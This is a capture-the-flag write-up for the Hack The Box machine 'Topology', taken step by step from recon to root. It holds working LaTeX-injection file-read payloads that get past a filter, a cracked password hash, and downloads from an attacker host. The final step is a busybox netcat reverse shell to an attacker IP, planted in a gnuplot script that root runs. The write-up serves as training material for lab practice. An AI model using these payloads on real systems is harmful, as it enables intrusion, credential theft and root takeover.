# Topology: Easy

```sh
sudo vim /etc/hosts
# add topology.htb

nmap -T4 -p- -A -Pn -v topology.htb
```

* open ports & services:

    * 22/tcp: ssh: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
    * 80/tcp: http: Apache httpd 2.4.41

* the webpage on port 80 is for 'Miskatonic University' of the 'Topology Group'

* the contact info includes a single email: 'lklein@topology.htb', and there are some staff members listed:

    * Lilian Klein: 'lklein@topology.htb'
    * Vajramani Daisley: 'vdaisley@topology.htb' (following the naming pattern for the given email)
    * Derek Abrahams: 'dabrahams@topology.htb'

* the website also mentions its software projects, one of which includes an outgoing link to 'http://latex.topology.htb/equation.php', for a LaTeX equation generator

* we can update the subdomain 'latex.topology.htb' in ```/etc/hosts```

* web enum:

    ```sh
    feroxbuster -u http://topology.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,js --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # recursive dir scan with small wordlist

    ffuf -c -u 'http://topology.htb' -H 'Host: FUZZ.topology.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 6767 -s
    # subdomain scan
    ```

* the subdomain scan using ```ffuf``` gives us a few more subdomains: we can update these in ```/etc/hosts```

    * 'dev.topology.htb'
    * 'stats.topology.htb'

* we can start checking all the subdomains one-by-one for any further info

* the subdomain 'latex.topology.htb' leads to a directory listing of several files: we can check them for any secrets:

    * the '/demo' directory has 4 image files: 'fraction.png', 'greek.png', 'sqrt.png', and 'summ.png': with each of the image files having a formula as per the filename

    * the '/equation.php' file leads to a 'LaTeX equation generator' page, where LaTeX code can be used as input to return a .PNG file: it mentions only one-liners are supported at the moment

    * the '/equationtest.aux' contains multiple lines of text; '.aux' files are used for LaTeX/TeX documents and act as a temporary storage

    * '/equationtest.log' file contains log info, likely for TeX processing

    * the file also provides version info for ```pdfTeX``` - version 3.14159265-2.6-1.40.20 (TeX Live 2019/Debian)

    * '/equationtest.out' is an empty file, but it is possible it could be for storing output

    * '/equationtest.pdf' contains a single formula with no other info

    * '/equationtest.tex' includes the sample formula that could be seen in the PDF file

    * '/header.tex' is for latex header for documents; it mentions the user 'vdaisley' in the comments

    * there is a '/tempfiles' folder but it is empty

* the subdomain 'dev.topology.htb' leads to a basic auth pop-up; trying weak creds like 'admin:admin' and 'admin:password' does not work

* the page for 'stats.topology.htb' leads to a static webpage with 2 images, and one of the image files is not showing

* checking the source code shows that the image files are '/files/load.png' and '/files/network.png': where the former seems to be a graph of average server load, and the latter cannot be displayed because it contains errors

* navigating to '/files' shows only these 2 image files, and the 'network.png' file is 0 bytes in size

* additionally, we can see that in '/files', the timestamp of the images changes roughly every minute or so; we can confirm this by checking the webpage 'http://stats.topology.htb': where the 'load.png' graph changes every few moments

* further web enum for the subdomains:

    ```sh
    feroxbuster -u http://latex.topology.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,js --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # recursive dir scan for latex subdomain with small wordlist

    feroxbuster -u http://dev.topology.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,js --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # recursive dir scan for dev subdomain with small wordlist

    feroxbuster -u http://stats.topology.htb -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,md,js --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # recursive dir scan for stats subdomain with small wordlist
    ```

* the recursive directory scans for the subdomains do not give anything useful, so we can try checking the LaTeX equation generator for any info

* we can intercept each request in Burp Suite to check for any other clues

* in the LaTeX equation generator, we can submit sample LaTeX code like ```\frac{x+5}{y-3}``` and click on 'Generate'

* this shows a GET request is made in the format '/equation.php?eqn=%5Cfrac%7Bx%2B5%7D%7By-3%7D&submit=', where the latex code is URL-encoded and used in the 'eqn' parameter, and the 'submit' parameter is left empty

* once the GET request is forwarded, we are redirected to the same URL, where the PNG image with the formula is generated

* checking the directory listing at 'latex.topology.htb' shows that the only file/folder that was modified is the '/tempfiles' directory, where the 'last modified' timestamp seems to have changed: indicating that is used to store the temporary files generated in the equation generator

* if we happen to use one of the headers from the '/header.tex' file, in the equation generator, we get an image with the text "Illegal command detected. Sorry"

* as the equation generator accepts LaTeX code, we can test with [LaTeX injection attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LaTeX%20Injection/README.md) and [LaTeX commands](https://offsec.pentest.tools/exploit/web/security-risk/latex-injection/):

    * we can start by testing basic file read payloads:

        * ```\input{/etc/passwd}```
        * ```\include{header}``` (to include 'header.tex' file from same directory)
    
    * we get the same image error for the payloads: "Illegal command detected. Sorry"

    * we can test with multi-line payloads, but the webapp currently allows only single line payloads

    * we can try to use commands with multiple lines in Burp Suite Repeater

    * if we intercept a request and try to use the ```\n``` character for multi-line, the image is not rendered correctly

    * if we use the URL-encoded version: ```%0a``` - the image is rendered for valid latex commands

    * we can use multi-line payloads with URL-encoded newline character

    * we can try reading files with single lines first:

        ```tex
        \newread\file
        \openin\file=/etc/hostname
        \read\file to\line
        \text{\line}
        \closein\file
        ```

        ```c
        \newread\file+%0A+\openin\file=/etc/hostname+%0A+\read\file+to\line+%0A+\text{\line}+%0A+\closein\file
        ```
    
    * this payload works successfully, and we get the image rendered with the text 'topology': as the hostname of the target
    
    * we can also try reading files with multiple lines:

        ```tex
        \lstinputlisting{/etc/passwd}
        \newread\file
        \openin\file=/etc/passwd
        \loop\unless\ifeof\file
            \read\file to\fileline
            \text{\fileline}
        \repeat
        \closein\file
        ```

        ```c
        \lstinputlisting{/etc/passwd}+%0A+\newread\file+%0A+\openin\file=/etc/passwd+%0A+\loop\unless\ifeof\file+%0A+\read\file+to\fileline+%0A+\text{\fileline}+%0A+\repeat+%0A+\closein\file
        ```
    
    * the payload to read files with multiple lines fail as the error message is shown: it is likely that one of the strings was detected

    * trying to use other payloads which include commands such as ```\usepackage```, ```\include``` or ```\input``` get blacklisted

    * we can try other file read payloads before testing for RCE:

        * ```\lstinputlisting{/etc/passwd}``` - this does not work
        * ```$\lstinputlisting{/etc/passwd}$``` - this works
        * ```$$\lstinputlisting{/etc/passwd}$$``` - this does not work
    
    * the payload ```$\lstinputlisting{/etc/passwd}$``` works for multi-line file reads as well: we can use this to enumerate the files further

* as we have a working LaTeX injection payload for file read, we can use it to try reading various files to check for any secrets:

    * ```/etc/passwd``` - this shows that the user 'vdaisley' exists on the box
    * ```/home/vdaisley/.ssh/id_rsa```
    * ```/home/vdaisley/.ssh/authorized_keys```
    * ```/home/vdaisley/.ssh/id_ed25519```
    * ```/home/vdaisley/.ssh/id_ed25519.pub```
    * ```/var/www/html/.env```
    * ```/var/www/html/.htaccess```
    * ```/var/www/html/.htpasswd```
    * ```/etc/apache2/apache2.conf``` - this file mentions the web directories ```/var/www``` and ```/home/vdaisley/stats```
    * ```/etc/apache2/sites-enabled/000-default.conf``` - this file mentions the server admin as 'vdaisley@topology.htb' and provides multiple web directories: ```/var/www/html```, ```/var/www/latex```, ```/var/www/dev```, and ```/var/www/stats```
    * ```/var/www/latex/equation.php``` - we can read the PHP code which shows the blacklisted strings, but does not include any secrets
    * ```/var/www/dev/.htaccess``` - mentions password at ```/var/www/dev/.htpasswd```
    * ```/var/www/dev/.htpasswd``` - this gives the password hash "$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0" for 'vdaisley'

* ```hashcat``` docs show that it is a Apache MD5 hash, mode 1600: we can try to crack it:

    ```sh
    vim vdaisleyhash
    # paste hash

    hashcat -a 0 -m 1600 vdaisleyhash /usr/share/wordlists/rockyou.txt
    # cracks the hash
    ```

* ```hashcat``` gives the cleartext password 'calculus20': we can try logging in over SSH first:

    ```sh
    ssh vdaisley@topology.htb
    # this works

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # does not work
    ```

* we can attempt initial enum using ```linpeas``` - fetch script from attacker:

    ```sh
    wget http://10.10.14.34:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-150-generic, Ubuntu 20.04.6
    * sudo version 1.8.31
    * CVE-2021-3493: Ubuntu OverlayFS exploit is highlighted
    * non-default app ```/usr/bin/pulseaudio``` has files opened in ```/home/vdaisley/.config/pulse```
    * non-default directory found in ```/opt```

* we can also check for any background processes using ```pspy``` - fetch the executable from attacker:

    ```sh
    wget http://10.10.14.34:8000/pspy64

    chmod +x pspy64

    ./pspy64
    ```

* ```pspy``` shows some non-default processes running with UID 0 (root), with respect to ```gnuplot``` - we get the following commands:

    ```sh
    gnuplot /opt/gnuplot/loadplot.plt

    find /opt/gnuplot -name *.plt -exec gnuplot {} ;

    /bin/sh /opt/gnuplot/getdata.sh

    /bin/sh -c /opt/gnuplot/getdata.sh

    gnuplot /opt/gnuplot/networkplot.plt

    tail -60 /opt/gnuplot/loaddata.dat
    ```

* we can try checking the ```gnuplot``` directory:

    ```sh
    ls -la /opt
    # the 'gnuplot' directory has write permissions

    ls -la /opt/gnuplot
    # permission denied

    # we cannot read any of the files

    gnuplot
    # shows version, help info
    ```

* the ```/opt/gnuplot``` is writable but not readable: indicating that we can write the files inside it, but cannot read any of the contents

* also, running the ```gnuplot``` binary shows that it is running "version 5.2, patchlevel 8"

* as the ```gnuplot``` binary is used for creating graphs and plots, it is likely that the graphs on 'http://stats.topology.htb': 'load.png' and 'network.png': is being drawn using the files ```/opt/gnuplot/loadplot.plt``` and ```/opt/gnuplot/networkplot.plt```

* Googling for the plot file formats for ```gnuplot```, and checking for any RCE/exploits shows that system commands can be executed in '.plt' files using the ```system``` command

* we can do a quick test for RCE by modifying ```/opt/gnuplot/networkplot.plt``` with a malicious ```system``` command, and check for reverse shell:

    ```sh
    # on attacker

    nc -nvlp 5555
    # setup listener
    ```

    ```sh
    # on target
    echo "system('busybox nc 10.10.14.34 5555 -e sh')" >> /opt/gnuplot/networkplot.plt
    # this fails with permission denied errors

    echo "system('busybox nc 10.10.14.34 5555 -e sh')" >> /opt/gnuplot/loadplot.plt
    # this also fails

    # we can create a new file as all '.plt' files should get executed
    echo "system('busybox nc 10.10.14.34 5555 -e sh')" >> /opt/gnuplot/testplot.plt
    ```

    ```sh
    # on attacker

    # within 2 minutes, we get a reverse shell on our listener

    id
    # root

    cat /root/root.txt
    # root flag
    ```
